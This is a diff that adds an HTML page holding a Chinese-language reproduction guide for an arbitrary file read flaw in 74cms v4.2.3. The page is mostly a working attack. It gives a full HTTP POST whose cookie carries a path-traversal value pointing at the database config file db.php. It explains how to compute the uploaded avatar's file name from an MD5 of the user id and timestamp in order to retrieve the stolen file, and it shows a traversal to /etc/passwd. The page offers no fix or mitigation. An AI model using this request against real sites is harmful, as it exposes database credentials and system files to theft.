@@ -1,0 +1,42 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
+			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="X8abfdfbe1b67f623130e977d575af30441e9ff0"><span class="csDE05BCC">74cms v4.2.3</span><span class="csECDA2D3">任意文件读取</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs8926E06">74cms v4.2.3</span></p><h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">先尝试读取</span><span class="cs8926E06"> db.php</span><span class="cs9C1B1871">，向服务器</span><span class="cs8926E06">post</span><span class="cs9C1B1871">如下数据</span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /index.php?m=&amp;c=members&amp;a=register HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: www.0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: */*</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: keep-alive</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php; members_bind_info[type]=qq; members_uc_info[password]=xcxmiku; members_uc_info[uid]=123456; members_uc_info[username]=xcxmiku</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">ajax=1&amp;reg_type=2&amp;utype=2&amp;org=bind&amp;ucenter=bind</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">会返回如下数据</span></p><p class="cs40DD2BC9"><span class="cs8926E06">1.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">/data/upload/avatar/</span><span class="cs9C1B1871">年月</span><span class="cs8926E06">/</span><span class="cs9C1B1871">日文件夹下</span><span class="cs8926E06"> </span><span class="cs9C1B1871">会生成一张图片</span></p><p class="cs40DD2BC9"><span class="cs8926E06">2.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">这张图片的名称由</span><span class="cs8926E06">id</span><span class="cs9C1B1871">和时间戳的</span><span class="cs8926E06">md5</span><span class="cs9C1B1871">值构成，我们可以将</span><span class="cs8926E06">Burp Suite</span><span class="cs9C1B1871">上返回的时间转换为时间戳</span></p><p class="cs40DD2BC9"><span class="cs8926E06">3.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">不过这个时间可能会有误差，如果不行就把时间</span><span class="cs8926E06">+-10</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我</span><span class="cs8926E06">post</span><span class="cs9C1B1871">的</span><span class="cs8926E06">id</span><span class="cs9C1B1871">为</span><span class="cs8926E06">654321</span><span class="cs9C1B1871">，获取的时间戳为</span><span class="cs8926E06">1571659588</span><span class="cs9C1B1871">，将他们连在一起进行</span><span class="cs8926E06">md5</span><span class="cs9C1B1871">加密</span></p><p class="cs40DD2BC9"><span class="cs8926E06">4.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">成功获取图片名，然后访问</span></p><p class="cs3A447A38"><span class="cs9FB05234">https://www.0-sec.org/data/upload/avatar/1910/21/9aaa3653bf6ec9491bc002b52521962c.jpg </span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">保存该图片用文本打开就是</span><span class="cs8926E06"> db.php </span><span class="cs9C1B1871">的内容。</span></p><h6 class="cs868C439D">
+			<a name="ps"><span class="cs4B51D5E4">PS:</span></a></h6>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">post</span><span class="cs9C1B1871">提交，参数如下</span></p><p class="cs40DD2BC9"><span class="cs8926E06">5.png</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在</span><span class="cs8926E06">Header</span><span class="cs9C1B1871">可获取到时间戳</span></p><p class="cs40DD2BC9"><span class="cs8926E06">6.png</span></p><h3 class="cs868C439D">
+			<a name="可能会遇到的问题"><span class="csD6CA00D2">可能会遇到的问题</span></a></h3>
+		<h6 class="cs868C439D">
+			<a name="post数据返回unicode编码"><span class="cs4B51D5E4">post</span><span class="cs1C2E50E7">数据返回</span><span class="cs4B51D5E4">unicode</span><span class="cs1C2E50E7">编码</span></a></h6>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">因为名称，密码，</span><span class="cs8926E06">ID</span><span class="cs9C1B1871">等内容格式不对或重复会出现这种情况，将</span><span class="cs8926E06">unicode</span><span class="cs9C1B1871">编码进行解码，按提示修改即可。</span></p><h6 class="cs868C439D">
+			<a name="读取其他文件"><span class="cs1C2E50E7">读取其他文件</span></a></h6>
+		<p class="cs40DD2BC9"><span class="cs8926E06">../../../../Application/Common/Conf/db.php</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">是读取</span><span class="cs8926E06">db.php</span><span class="cs9C1B1871">，如果想读取根目录可以构造</span></p><p class="cs40DD2BC9"><span class="cs8926E06">../../../../../../../../etc/passwd</span></p><h6 class="cs868C439D">
+			<a name="时间戳问题"><span class="cs1C2E50E7">时间戳问题</span></a></h6>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">服务器返回的时间，服务器返回的是</span><span class="cs8926E06">GMT</span><span class="cs9C1B1871">格林威治标准时间，没有加上时区，只记录分秒即可</span></p></body>
+</html>
